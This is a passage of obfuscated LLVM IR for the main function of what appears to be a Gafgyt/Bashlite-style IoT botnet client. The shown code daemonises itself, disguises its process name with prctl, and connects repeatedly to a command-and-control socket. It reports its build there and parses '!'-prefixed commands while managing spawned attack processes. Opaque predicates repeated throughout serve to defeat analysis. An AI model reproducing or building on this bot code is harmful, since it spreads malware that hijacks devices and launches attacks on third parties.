  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.87
  %4 = load i32, i32* @y.88
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [4096 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca [1024 x i8], align 16
  %28 = alloca i32, align 4
  %29 = alloca [10 x i8*], align 16
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i32 0, i32 0), i8** %14, align 8
  %33 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.100, i32 0, i32 0), i32 0) #2
  %34 = icmp ne i32 %33, -1
  %35 = load i32, i32* @x.87
  %36 = load i32, i32* @y.88
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %44

; <label>:43:                                     ; preds = %originalBBpart2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i32 0, i32 0), i8** %14, align 8
  br label %61

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = load i32, i32* @x.87
  %46 = load i32, i32* @y.88
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.102, i32 0, i32 0), i8** %14, align 8
  %53 = load i32, i32* @x.87
  %54 = load i32, i32* @y.88
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %61

; <label>:61:                                     ; preds = %originalBBpart24, %43
  %62 = call i8* @getBuild()
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* %62)
  %64 = load i8**, i8*** %13, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = load i8**, i8*** %13, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 0
  %69 = load i8*, i8** %68, align 8
  %70 = call i64 @strlen(i8* %69) #10
  %71 = call i8* @strncpy(i8* %66, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i32 0, i32 0), i64 %70) #2
  %72 = load i8**, i8*** %13, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 0
  %74 = load i8*, i8** %73, align 8
  %75 = load i8*, i8** %14, align 8
  %76 = call i32 (i8*, i8*, ...) @sprintf(i8* %74, i8* %75) #2
  %77 = load i8*, i8** %14, align 8
  %78 = ptrtoint i8* %77 to i64
  %79 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %78, i32 0, i32 0, i32 0)
  %80 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %81 = call i32 @getpid() #2
  %82 = xor i32 %80, %81
  call void @srand(i32 %82) #2
  %83 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %84 = call i32 @getpid() #2
  %85 = xor i32 %83, %84
  call void @init_rand(i32 %85)
  %86 = call i32 @getOurIP()
  %87 = call i32 @fork() #2
  store i32 %87, i32* %15, align 4
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %108

; <label>:89:                                     ; preds = %61
  %90 = load i32, i32* @x.87
  %91 = load i32, i32* @y.88
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  %98 = load i32, i32* %15, align 4
  %99 = call i32 @waitpid(i32 %98, i32* %17, i32 0)
  call void @exit(i32 0) #14
  %100 = load i32, i32* @x.87
  %101 = load i32, i32* @y.88
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:108:                                    ; preds = %61
  %109 = load i32, i32* %15, align 4
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %122, label %111

; <label>:111:                                    ; preds = %108
  %112 = call i32 @fork() #2
  store i32 %112, i32* %16, align 4
  %113 = icmp ne i32 %112, 0
  br i1 %113, label %114, label %115

; <label>:114:                                    ; preds = %111
  call void @exit(i32 0) #14
  unreachable

; <label>:115:                                    ; preds = %111
  %116 = load i32, i32* %16, align 4
  %117 = icmp ne i32 %116, 0
  br i1 %117, label %119, label %118

; <label>:118:                                    ; preds = %115
  br label %120

; <label>:119:                                    ; preds = %115
  br label %120

; <label>:120:                                    ; preds = %119, %118
  br label %121

; <label>:121:                                    ; preds = %120
  br label %139

; <label>:122:                                    ; preds = %108
  %123 = load i32, i32* @x.87
  %124 = load i32, i32* @y.88
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %122
  %131 = load i32, i32* @x.87
  %132 = load i32, i32* @y.88
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %139

; <label>:139:                                    ; preds = %originalBBpart212, %121
  br label %140

; <label>:140:                                    ; preds = %139
  %141 = call i32 @setsid() #2
  %142 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %143 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %144

; <label>:144:                                    ; preds = %773, %163, %140
  %145 = load i32, i32* @x.87
  %146 = load i32, i32* @y.88
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %144
  %153 = call i32 @initConnection()
  %154 = icmp ne i32 %153, 0
  %155 = load i32, i32* @x.87
  %156 = load i32, i32* @y.88
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %154, label %163, label %165

; <label>:163:                                    ; preds = %originalBBpart216
  %164 = call i32 @sleep(i32 5)
  br label %144

; <label>:165:                                    ; preds = %originalBBpart216
  %166 = load i32, i32* @mainCommSock, align 4
  %167 = call i8* @getBuild()
  %168 = call i32 (i32, i8*, ...) @sockprintf(i32 %166, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* %167)
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  br label %169

; <label>:169:                                    ; preds = %772, %614, %488, %386, %165
  %170 = load i32, i32* @x.87
  %171 = load i32, i32* @y.88
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %169
  %178 = load i32, i32* @mainCommSock, align 4
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %180 = call i32 @recvLine(i32 %178, i8* %179, i32 4096)
  store i32 %180, i32* %19, align 4
  %181 = icmp ne i32 %180, -1
  %182 = load i32, i32* @x.87
  %183 = load i32, i32* @y.88
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %181, label %190, label %773

; <label>:190:                                    ; preds = %originalBBpart220
  %191 = load i32, i32* @x.87
  %192 = load i32, i32* @y.88
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %190
  store i32 0, i32* %20, align 4
  %199 = load i32, i32* @x.87
  %200 = load i32, i32* @y.88
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %207

; <label>:207:                                    ; preds = %358, %originalBBpart224
  %208 = load i32, i32* @x.87
  %209 = load i32, i32* @y.88
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %207
  %216 = load i32, i32* %20, align 4
  %217 = sext i32 %216 to i64
  %218 = load i64, i64* @numpids, align 8
  %219 = icmp ult i64 %217, %218
  %220 = load i32, i32* @x.87
  %221 = load i32, i32* @y.88
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %219, label %228, label %361

; <label>:228:                                    ; preds = %originalBBpart228
  %229 = load i32, i32* @x.87
  %230 = load i32, i32* @y.88
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %228
  %237 = load i32*, i32** @pids, align 8
  %238 = load i32, i32* %20, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i32, i32* %237, i64 %239
  %241 = load i32, i32* %240, align 4
  %242 = call i32 @waitpid(i32 %241, i32* null, i32 1)
  %243 = icmp sgt i32 %242, 0
  %244 = load i32, i32* @x.87
  %245 = load i32, i32* @y.88
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %243, label %252, label %357

; <label>:252:                                    ; preds = %originalBBpart232
  %253 = load i32, i32* %20, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %22, align 4
  br label %255

; <label>:255:                                    ; preds = %287, %252
  %256 = load i32, i32* @x.87
  %257 = load i32, i32* @y.88
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %255
  %264 = load i32, i32* %22, align 4
  %265 = zext i32 %264 to i64
  %266 = load i64, i64* @numpids, align 8
  %267 = icmp ult i64 %265, %266
  %268 = load i32, i32* @x.87
  %269 = load i32, i32* @y.88
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %267, label %276, label %290

; <label>:276:                                    ; preds = %originalBBpart236
  %277 = load i32*, i32** @pids, align 8
  %278 = load i32, i32* %22, align 4
  %279 = zext i32 %278 to i64
  %280 = getelementptr inbounds i32, i32* %277, i64 %279
  %281 = load i32, i32* %280, align 4
  %282 = load i32*, i32** @pids, align 8
  %283 = load i32, i32* %22, align 4
  %284 = sub i32 %283, 1
  %285 = zext i32 %284 to i64
  %286 = getelementptr inbounds i32, i32* %282, i64 %285
  store i32 %281, i32* %286, align 4
  br label %287

; <label>:287:                                    ; preds = %276
  %288 = load i32, i32* %22, align 4
  %289 = add i32 %288, 1
  store i32 %289, i32* %22, align 4
  br label %255

; <label>:290:                                    ; preds = %originalBBpart236
  %291 = load i32, i32* @x.87
  %292 = load i32, i32* @y.88
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %290
  %299 = load i32*, i32** @pids, align 8
  %300 = load i32, i32* %22, align 4
  %301 = sub i32 %300, 1
  %302 = zext i32 %301 to i64
  %303 = getelementptr inbounds i32, i32* %299, i64 %302
  store i32 0, i32* %303, align 4
  %304 = load i64, i64* @numpids, align 8
  %305 = add i64 %304, -1
  store i64 %305, i64* @numpids, align 8
  %306 = load i64, i64* @numpids, align 8
  %307 = add i64 %306, 1
  %308 = mul i64 %307, 4
  %309 = call noalias i8* @malloc(i64 %308) #2
  %310 = bitcast i8* %309 to i32*
  store i32* %310, i32** %21, align 8
  store i32 0, i32* %22, align 4
  %311 = load i32, i32* @x.87
  %312 = load i32, i32* @y.88
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart260, label %originalBB38alteredBB

originalBBpart260:                                ; preds = %originalBB38
  br label %319

; <label>:319:                                    ; preds = %originalBBpart268, %originalBBpart260
  %320 = load i32, i32* %22, align 4
  %321 = zext i32 %320 to i64
  %322 = load i64, i64* @numpids, align 8
  %323 = icmp ult i64 %321, %322
  br i1 %323, label %324, label %353

; <label>:324:                                    ; preds = %319
  %325 = load i32*, i32** @pids, align 8
  %326 = load i32, i32* %22, align 4
  %327 = zext i32 %326 to i64
  %328 = getelementptr inbounds i32, i32* %325, i64 %327
  %329 = load i32, i32* %328, align 4
  %330 = load i32*, i32** %21, align 8
  %331 = load i32, i32* %22, align 4
  %332 = zext i32 %331 to i64
  %333 = getelementptr inbounds i32, i32* %330, i64 %332
  store i32 %329, i32* %333, align 4
  br label %334

; <label>:334:                                    ; preds = %324
  %335 = load i32, i32* @x.87
  %336 = load i32, i32* @y.88
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %334
  %343 = load i32, i32* %22, align 4
  %344 = add i32 %343, 1
  store i32 %344, i32* %22, align 4
  %345 = load i32, i32* @x.87
  %346 = load i32, i32* @y.88
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart268, label %originalBB62alteredBB

originalBBpart268:                                ; preds = %originalBB62
  br label %319

; <label>:353:                                    ; preds = %319
  %354 = load i32*, i32** @pids, align 8
  %355 = bitcast i32* %354 to i8*
  call void @free(i8* %355) #2
  %356 = load i32*, i32** %21, align 8
  store i32* %356, i32** @pids, align 8
  br label %357

; <label>:357:                                    ; preds = %353, %originalBBpart232
  br label %358

; <label>:358:                                    ; preds = %357
  %359 = load i32, i32* %20, align 4
  %360 = add nsw i32 %359, 1
  store i32 %360, i32* %20, align 4
  br label %207

; <label>:361:                                    ; preds = %originalBBpart228
  %362 = load i32, i32* @x.87
  %363 = load i32, i32* @y.88
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %361
  %370 = load i32, i32* %19, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i64 0, i64 %371
  store i8 0, i8* %372, align 1
  %373 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %373)
  %374 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %375 = call i8* @strstr(i8* %374, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0)) #10
  %376 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %377 = icmp eq i8* %375, %376
  %378 = load i32, i32* @x.87
  %379 = load i32, i32* @y.88
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %377, label %386, label %389

; <label>:386:                                    ; preds = %originalBBpart272
  %387 = load i32, i32* @mainCommSock, align 4
  %388 = call i32 (i32, i8*, ...) @sockprintf(i32 %387, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0))
  br label %169

; <label>:389:                                    ; preds = %originalBBpart272
  %390 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %391 = call i8* @strstr(i8* %390, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #10
  %392 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %393 = icmp eq i8* %391, %392
  br i1 %393, label %394, label %411

; <label>:394:                                    ; preds = %389
  %395 = load i32, i32* @x.87
  %396 = load i32, i32* @y.88
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %394
  call void @exit(i32 0) #14
  %403 = load i32, i32* @x.87
  %404 = load i32, i32* @y.88
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  unreachable

; <label>:411:                                    ; preds = %389
  %412 = load i32, i32* @x.87
  %413 = load i32, i32* @y.88
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %411
  %420 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  store i8* %420, i8** %23, align 8
  %421 = load i8*, i8** %23, align 8
  %422 = load i8, i8* %421, align 1
  %423 = zext i8 %422 to i32
  %424 = icmp eq i32 %423, 33
  %425 = load i32, i32* @x.87
  %426 = load i32, i32* @y.88
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %424, label %433, label %772

; <label>:433:                                    ; preds = %originalBBpart280
  %434 = load i8*, i8** %23, align 8
  %435 = getelementptr inbounds i8, i8* %434, i64 1
  store i8* %435, i8** %24, align 8
  br label %436

; <label>:436:                                    ; preds = %480, %433
  %437 = load i32, i32* @x.87
  %438 = load i32, i32* @y.88
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %436
  %445 = load i8*, i8** %24, align 8
  %446 = load i8, i8* %445, align 1
  %447 = zext i8 %446 to i32
  %448 = icmp ne i32 %447, 32
  %449 = load i32, i32* @x.87
  %450 = load i32, i32* @y.88
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %448, label %457, label %478

; <label>:457:                                    ; preds = %originalBBpart284
  %458 = load i32, i32* @x.87
  %459 = load i32, i32* @y.88
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %457
  %466 = load i8*, i8** %24, align 8
  %467 = load i8, i8* %466, align 1
  %468 = zext i8 %467 to i32
  %469 = icmp ne i32 %468, 0
  %470 = load i32, i32* @x.87
  %471 = load i32, i32* @y.88
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %478

; <label>:478:                                    ; preds = %originalBBpart288, %originalBBpart284
  %479 = phi i1 [ false, %originalBBpart284 ], [ %469, %originalBBpart288 ]
  br i1 %479, label %480, label %483

; <label>:480:                                    ; preds = %478
  %481 = load i8*, i8** %24, align 8
  %482 = getelementptr inbounds i8, i8* %481, i32 1
  store i8* %482, i8** %24, align 8
  br label %436

; <label>:483:                                    ; preds = %478
  %484 = load i8*, i8** %24, align 8
  %485 = load i8, i8* %484, align 1
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 0
  br i1 %487, label %488, label %489

; <label>:488:                                    ; preds = %483
  br label %169

; <label>:489:                                    ; preds = %483
  %490 = load i8*, i8** %24, align 8
  store i8 0, i8* %490, align 1
  %491 = load i8*, i8** %23, align 8
  %492 = getelementptr inbounds i8, i8* %491, i64 1
  store i8* %492, i8** %24, align 8
  %493 = load i8*, i8** %23, align 8
  %494 = load i8*, i8** %24, align 8
  %495 = call i64 @strlen(i8* %494) #10
  %496 = getelementptr inbounds i8, i8* %493, i64 %495
  %497 = getelementptr inbounds i8, i8* %496, i64 2
  store i8* %497, i8** %23, align 8
  br label %498

; <label>:498:                                    ; preds = %550, %489
  %499 = load i32, i32* @x.87
  %500 = load i32, i32* @y.88
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %498
  %507 = load i8*, i8** %23, align 8
  %508 = load i8*, i8** %23, align 8
  %509 = call i64 @strlen(i8* %508) #10
  %510 = sub i64 %509, 1
  %511 = getelementptr inbounds i8, i8* %507, i64 %510
  %512 = load i8, i8* %511, align 1
  %513 = zext i8 %512 to i32
  %514 = icmp eq i32 %513, 10
  %515 = load i32, i32* @x.87
  %516 = load i32, i32* @y.88
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart296, label %originalBB90alteredBB

originalBBpart296:                                ; preds = %originalBB90
  br i1 %514, label %548, label %523

; <label>:523:                                    ; preds = %originalBBpart296
  %524 = load i32, i32* @x.87
  %525 = load i32, i32* @y.88
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %523
  %532 = load i8*, i8** %23, align 8
  %533 = load i8*, i8** %23, align 8
  %534 = call i64 @strlen(i8* %533) #10
  %535 = sub i64 %534, 1
  %536 = getelementptr inbounds i8, i8* %532, i64 %535
  %537 = load i8, i8* %536, align 1
  %538 = zext i8 %537 to i32
  %539 = icmp eq i32 %538, 13
  %540 = load i32, i32* @x.87
  %541 = load i32, i32* @y.88
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart2107, label %originalBB98alteredBB

originalBBpart2107:                               ; preds = %originalBB98
  br label %548

; <label>:548:                                    ; preds = %originalBBpart2107, %originalBBpart296
  %549 = phi i1 [ true, %originalBBpart296 ], [ %539, %originalBBpart2107 ]
  br i1 %549, label %550, label %556

; <label>:550:                                    ; preds = %548
  %551 = load i8*, i8** %23, align 8
  %552 = load i8*, i8** %23, align 8
  %553 = call i64 @strlen(i8* %552) #10
  %554 = sub i64 %553, 1
  %555 = getelementptr inbounds i8, i8* %551, i64 %554
  store i8 0, i8* %555, align 1
  br label %498

; <label>:556:                                    ; preds = %548
  %557 = load i32, i32* @x.87
  %558 = load i32, i32* @y.88
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %556
  %565 = load i8*, i8** %23, align 8
  store i8* %565, i8** %25, align 8
  %566 = load i32, i32* @x.87
  %567 = load i32, i32* @y.88
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %574

; <label>:574:                                    ; preds = %586, %originalBBpart2111
  %575 = load i8*, i8** %23, align 8
  %576 = load i8, i8* %575, align 1
